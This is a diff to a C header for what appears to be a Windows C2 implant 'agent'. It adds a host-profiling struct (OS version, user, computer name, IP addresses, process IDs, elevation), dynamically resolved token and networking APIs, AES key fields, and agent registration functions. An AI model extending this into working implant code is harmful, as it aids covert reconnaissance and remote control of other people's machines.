@@ -5,13 +5,40 @@
 
 struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.
 
+typedef struct _ContextInfo {
+	DWORD dwMajorVersion;
+	DWORD dwMinorVersion;
+	DWORD dwBuildNumber;
+	DWORD dwPlatformId;
+	WORD   wServicePackMajor;
+	WORD   wServicePackMinor;
+	WORD   wSuiteMask;
+	BYTE  wProductType;
+	LPSTR UserName;
+	LPSTR ComputerName;
+	LPSTR IPAddress[5];
+	DWORD PID;
+	DWORD TID;
+	DWORD PPID;
+	WORD OS_Arch;
+	WORD Process_Arch;
+	BOOL Elevated;
+} ContextInfo, *PContextInfo ;
+
+//TODO clean up this structure.
+//I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
 typedef struct _Agent {
 
 
 	//enumeration apis
 	//NTDLL APIS
 	t_RtlGetVersion pRtlGetVersion;
+	t_NtClose pNtClose;
+	t_NtOpenProcessToken pNtOpenProcessToken;
+	t_NtOpenThreadToken pNtOpenThreadToken;
+	t_NtQueryInformationToken pNtQueryInformationToken;
 
+	
 	//KERNEL32 APIS
 	t_GetComputerNameExA pGetComputerNameExA;
 
@@ -22,6 +49,16 @@ typedef struct _Agent {
 	//USER32 APIS
 	HMODULE hUser32;
 	t_GetSystemMetrics pGetSystemMetrics;
+
+	//IPHLPAPI APIS'
+	HMODULE hIphlpapi;
+	t_GetAdaptersAddresses pGetAdaptersAddresses;
+
+	//Ws2_32 APIS
+	HMODULE hWs2_32;
+	t_WSAStartup pWSAStartup;
+	t_WSACleanup pWSACleanup;
+	t_inet_ntop pInetNtop;
 
 	//http request APIS
 	//WINHTTP APIS
@@ -35,12 +72,17 @@ typedef struct _Agent {
 	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
 	t_WinHttpSetOption pWinHttpSetOption;
 
-
+	//agent metadata
 	UINT32 AgentID;
 	char EndPoint[256];
-	LPSTR OperatingSystem;
-	LPSTR UserName;
-	LPSTR ComputerName;
+
+	//current context info
+	PContextInfo Context;
+
+
+	P_INT_TEB pTeb;
+
+	//crypto info.
 	BYTE* AESKey;
 	ULONG AESKeySize;
 	BYTE* EncryptedAESKey;
@@ -69,3 +111,6 @@ enum Agent_Operations {
 
 
 INT init_agent(pAgent agent);
+INT RegisterAgent(pAgent agent);
+BOOL SendRegisterRequest(pAgent agent, VOID* Buffer, ULONG BufferLength);
+void AgentMain();
